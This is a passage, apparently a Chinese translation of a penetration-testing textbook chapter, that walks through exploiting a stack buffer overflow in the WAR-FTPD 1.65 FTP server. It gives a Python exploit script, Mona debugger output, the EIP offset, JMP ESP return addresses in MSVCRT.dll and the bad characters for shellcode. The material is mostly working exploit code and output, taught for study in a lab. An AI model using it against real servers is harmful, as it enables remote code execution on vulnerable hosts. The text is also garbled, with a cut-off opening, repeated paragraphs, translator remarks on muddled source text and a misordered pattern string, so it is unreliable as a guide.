  \  Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7\n\
  \  Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3\n\
  \  Bf4Bf5Bf6Bf7B8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9\n\
  \  Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5\n\
  \  Bk\"\n  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n  connect=s.connect(('192.168.20.10',21))\n\
  \  response = s.recv(1024)\n  print response\n  s.send('USER ' + buffer  + '\\r\\\
  n')\n  response = s.recv(1024)\n  print response\n  s.send('PASS PASSWORD\\r\\n')\n\
  \  s.close()\n```\n\n现在使用从 ❶ 开始的生成的模式再次运行漏洞程序，替换那 1,100 个 `A`。\n\n```\nroot@kali:~#\
  \ ./ftpexploit\n220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready\n220 Please\
  \ enter your user name.\n331 User name okay, Need password.\n```\n\n在使用 Metasploit\
  \ 的模式运行我们的漏洞后，回到如图 17-7 所示的 Immunity Debugger，查看 `EIP` 中包含什么值，并找到我们在攻击字符串的何处覆盖了返回地址。\n\
  \n![查找返回地址的覆盖](img/httpatomoreillycomsourcenostarchimages2030522.png.jpg)图 17-7.\
  \ 查找返回地址的覆盖\n\nWar-FTP 再次崩溃了，但这次 `EIP` 包含了我们生成的模式中的四个字节字节：`32714131`。我们可以使用 Mona\
  \ 来确定在 1,100 字符循环模式中，`32714131` 的 ASCII 等效字符的具体位置。输入 `!mona pattern_offset 32714131`\
  \ 获取偏移量，或者在 Immunity Debugger 提示符处输入 `!mona findmsp`（如图 17-8 所示），让 Mona 对所有寄存器内存内存模式实例进行额外的分析。\n\
  \n![在 Mona 中查找模式偏移量](img/httpatomoreillycomsourcenostarchimages2030524.png.jpg)图\
  \ 17-8. 在 Mona 中查找模式偏移量\n\nMona 在内存中找到了循环模式的实例。命令的输出被写入 `C:\\logs\\war-ftpd\\findmsp.txt`。这里显示输出的一部分。\n\
  \n```\nEIP contains normal pattern : 0x32714131 (offset 485)\nESP (0x00affd48) points\
  \ at offset 493 in normal pattern (length 607)\nEDI (0x00affe48) points at offset\
  \ 749 in normal pattern (length 351)\nEBP (0x00affda0) points at offset 581 in normal\
  \ pattern (length 519)\n```\n\n### 验证偏移量\n\n根据 Mona 的显示，我们的返回地址覆盖位于攻击字符串的第 485 字节处。我们可以像示例\
  \ 17-4 所示进行验证。\n\n示例 17-4. 验证 EIP 偏移量\n\n```\n root@kali:~# cat ftpexploit\n  #!/usr/bin/python\n\
  \  import socket\n  ❶ buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\n\
  \  Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8\n\
  \  Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4\n\
  \  Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0\n\
  \  Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6\n\
  \  Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2\n\
  \  Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ap3Ar7Ar8\n\
  \  Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4\n\
  \  Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Ax2Ax3Ax4\n\
  \  Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0\n\
  \  Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7\n\
  \  Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3\n\
  \  Bf4Bf5Bf6Bf7B8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9\n\
  \  Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5\n\
  \  Bk\"\n  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n  connect=s.connect(('192.168.20.10',21))\n\
  \  response = s.recv(1024)\n  print response\n  s.send('USER ' + buffer  + '\\r\\\
  n')\n  response = s.recv(1024)\n  print response\n  s.send('PASS PASSWORD\\r\\n')\n\
  \  s.close()\n```\n\n现在我们使用了替换了 1,100 个 `A` 的从 ❶ 开始的模式来创建攻击字符串。由于 `EIP` 包含了 485\
  \ 字节处的 `C`，这确认了我们覆盖了返回地址。我们可以使用 Mona 来确定确定 `32714131` 的 ASCII 等效字符在 1,100 字符循环模式中的具体位置。根据\
  \ Mona 的显示，我们的返回地址覆盖位于攻击字符串的第 485 字节处。我们可以像示例 17-4 所示进行验证。\n\n### 劫持执行流\n\n在第 16\
  \ 章讨论的漏洞漏洞示例中，我们将执行流重定向到另一个函数。不幸的是，我们没有 War-FTP 的源代码进行审查，因此我们将使用一种更常用的技术。\n\n首先，我们需要确认在崩溃时攻击字符串的一部分是否易于访问。回看\
  \ `mona findmsp` 命令在 `C:\\logs\\war-ftpd\\findmsp.txt` 中的输出，如下。\n\n```\nEIP contains\
  \ normal pattern : 0x32714131 (offset 485)\nESP (0x00affd48) points at offset 493\
  \ in normal pattern (length 607)\nEDI (0x00affe48) points at offset 749 in normal\
  \ pattern (length 351)\nEBP (0x00affda0) points at offset 581 in normal pattern\
  \ (length 519)\n```\n\n除了控制 `EIP` 之外，寄存器 `ESP`、`EDI` 和 `EBP` 也指向攻击字符串的一部分。换句话说，我们的攻击字符串决定了这些寄存器的内容，没有什么阻止我们将攻击字符串的一部分（我们当前崩溃中的\
  \ `C`s）替换为 CPU 执行的有用指令。\n\n我们可以看到 `ESP` 位于内存地址 `00AFFD48`，而 `EBP` 在内存中较高处的 `00AFFDA0`。`EDI`\
  \ 位于 `00AFFE48`。我们可以将执行重定向到这些位置的任何一个，但由于较低地址位于栈上方，我们为自己的指令提供了更多的空间。\n\n### 注意\n\n\
  此外，注意 `ESP` 并没有直接指向 `Cs` 的开头。我们的返回指针覆盖位于模式中的第 485 字节，但 `ESP` 在 493，相差 8 字节（四个字节返回地址和四个字节的\
  \ Cs）。\n\n在 Immunity Debugger 窗口的右上角右键点击 **ESP**，选择 **Follow in Stack**。栈显示在 Immunity\
  \ Debugger 窗口的右下角。向上滚动几行，如图 17-10 所示。（这种情况会经常发生，因为这四个 `C`s 是由调用约定引起的，表示函数已经清理了参数。）\n\
  \n\n\n\n\n调用约定（Calling conventions）是编译器中实现的一组规则，描述了子函数如何从其调用者函数接收参数。某些约定会由调用者函数从栈中移除参数，而另一些约定则规定必须由子函数移除参数。后者会导致子函数结束时，在栈上自动跳过一个或多个\
  \ dword（取决于参数的数量），如图 17-10 所示。\n\n![ESP controlled by the attack string](img/httpatomoreillycomsourcenostarchimages2030528.png.jpg)图\
  \ 17-10.  由攻击字符串控制的 ESP\n\n现在我们只需要将 `00AFFD48` 放入返回地址，将我们的 `C` 替换为 shellcode（机机代码），我们就有了一个完整的利用程序了，对吧？接近了，但并不完全。遗憾的是，如果我们只是直接将地址\
  \ `00AFFD48` 硬编码到返回地址中，该利用程序对我们来说可能运行良好，但在其他情况下却不行——而我们希望它能够尽可能通用。正如我们在第 16 章 中看到的，像\
  \ `ESP` 寄存器的位置可能会根据程序因素发生变化，例如提供的参数的长度，或者因为栈与线程绑定，这意味着下一次你攻击该应用程序时，栈地址可能会不同。幸运的是我们，跳转到\
  \ CPU 寄存器并执行其内容通常用汇编语言指令 `JMP ESP`（或根据需要使用另一个寄存器名称）表示。在未启用 ASLR（地址空间布局随机化）的操作系统中，例如我们的目标\
  \ Windows XP SP3，Windows DLL 每次都会加载到内存中的相同位置。这意味着如果我们在 Windows XP 目标的某个可执行模块内部找到\
  \ `JMP ESP`，那么它在每台 Windows XP SP3 英文版机器上都应该处于相同的位置。\n\n对于这一点，`JMP ESP` 并不是我们唯一的选择。只要我们最终让执行指向\
  \ `ESP`，就可以使用与 `JMP ESP` 等效的指令甚至一系列指令。例如，`CALL ESP` 是可行的，或者使用 `PUSH ESP` 后跟 `RET`，这会将执行发送到\
  \ `ESP` 中的内存地址。\n\n我们可以使用命令 `!mona jmp -r esp` 在 War-FTP 的可执行模块中找到所有 `JMP ESP` 及其逻辑等效项，如图\
  \ 17-11 所示。\n\n![Searching for JMP ESP with Mona](img/httpatomoreillycomsourcenostarchimages2030530.png.jpg)图\
  \ 17-11.  使用 Mona 搜索 `JMP ESP`\n\n结果被写入 `C:\\logs\\war-ftpd\\jmp.txt`。我们看到了 84 个可能的\
  \ `JMP ESP`（或等效）指令。某些可能包含坏字符（我们将在本书稍后讨论）——我们应该选择哪条指令？根据经验法则，选择属于应用程序本身而不是操作系统的模块。如果不可行，尝试相对稳定的模块，如\
  \ `MSVCRT.dll`，因为与其它 Windows 模块相比，Windows 补丁对该模块的更改非常少（尽管根据操作系统的语言仍可能发生更改）。Mona\
  \ 在 `MSVCRT.dll` 中找到的 `JMP ESP` 指令所示：\n\n```\n0x77c35459 : push esp # ret  |  {PAGE_EXECUTE_READ}\
  \ [MSVCRT.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.512\
  \ (C:\\WINDOWS\\system32)\n0x77c354b2 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSVCRT.dll]\
  \ ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.512\n0x77c35524\
  \ : push esp # ret  |  {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,\
  \ SafeSEH: True, OS: True, v7.0.2600.512\n0x77c51025 : push esp # ret  |  {PAGE_EXECUTE_READ}\
  \ [MSVCRT.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.512\n\
  ```\n\n就此而言，`JMP ESP` 并不是（此处原文逻辑断层）正如我们在第 16 章 中看到的，`ESP` 寄存器的位置可能会根据程序因素发生变化，例如提供的参数的长度，或者因为栈与线程绑定，这意味着下一次你攻击该应用程序时，栈地址可能会不同。幸运的是我们，跳转到\
  \ CPU 寄存器并执行其内容通常用汇编语言指令 `JMP ESP`（或根据需要使用另一个寄存器名称）表示。在未启用 ASLR 的操作系统中，例如我们的目标 Windows\
  \ XP SP3，Windows DLL 每次都会加载到内存中的相同位置。这意味着如果我们在 Windows XP 目标的某个可执行模块内部找到 `JMP ESP`，那么它在每台\
  \ Windows XP SP3 英文版机器上都应该处于相同的位置。\n\n（注：由于原文该处存在大量文本重复和格式混乱，此处译文尽可能还原其结构并翻译）\n\n\
  使用第一个：`PUSH ESP` 后跟 `RET`，在 `0x77c35459` 处设置断。正如我们在第 16 章 中看到的，`ESP` 寄存器的位置可能会根据程序因素发生变化...\n\
  \n![Breakpoints](img/httpatomoreillycomsourcenostarchimages2030532.jpg)\n\n（此处原文重复）\n\
  \n## 获取 Shell\n\n现在我们只需要在上一一节的 `D` 处填入一些有用的内容，让 CPU 代替我们执行。\n\n### 注意\n\n\n\n\n\n\
  当你尝试让 War-FTP 崩溃时，你会发现实际上可以把攻击字符串稍微写大一点，但在接近 1,150 个字符时，情况开始变得异常。（我们将在第 18 章）中讨论这个问题。）在\
  \ 1,100 个字符时是安全的，我们的利用程序每次都能按预期方式工作。\n\n我们目前的利用程序字符串包含 607 个 `D`，因此我们有 607 个字节的空间来存放机器码（shellcode）。最后，我们需要告诉\
  \ `Msfvenom` 在创建有效荷时需要避免哪些特殊字符。在这种情况下，我们需要避免空字节（`\\x00`）、回车（`\\x0d`）、换行符（`\\x0a`）和\
  \ `@`（`\\x40`）。\n\n### 注意事项\n\n寻找坏字符（bad characters）是一个超出本书范围的高级的话题，所以请相信我，这些对于该利用程序来说是正确的。这些坏字符是有根据的：空字节终止字符串，回车和换行符表示新行，而\
  \ `@` 会破坏 FTP 登录的 `user@server` 语法。关于此主题的更多信息，请查看我的博客文章“使用 Immunity Debugger 和 Mona.py\
  \ 寻找坏字符”（*[`www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/`](http://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)*）。\n\
